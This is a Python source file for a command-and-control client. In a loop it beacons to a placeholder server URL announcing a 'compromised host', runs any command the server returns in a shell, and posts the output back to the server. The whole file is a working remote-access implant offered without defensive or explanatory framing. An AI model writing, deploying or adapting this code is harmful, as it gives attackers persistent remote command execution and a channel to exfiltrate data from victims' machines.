import os
import time
import requests
import subprocess

class C2Client:
    def __init__(self, server_url="__C2_SERVER_URL__"):
        self.server_url = server_url

    def beacon(self, data):
        try:
            response = requests.post(self.server_url, data=data)
            if response.status_code == 200:
                command = response.text
                print(f"Received command: {command}")
                result = self.execute_command(command)
                self.send_result(result)
                return {"status": "success", "command": command, "result": result}
            else:
                return {"status": "error", "message": f"Beacon failed with status code {response.status_code}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8')
        except Exception as e:
            return str(e)

    def send_result(self, result):
        try:
            requests.post(f"{self.server_url}/result", data=result)
        except Exception as e:
            print(f"Failed to send result: {e}")

if __name__ == "__main__":
    c2_client = C2Client()
    while True:
        c2_client.beacon("Beacon from compromised host")
        time.sleep(10)
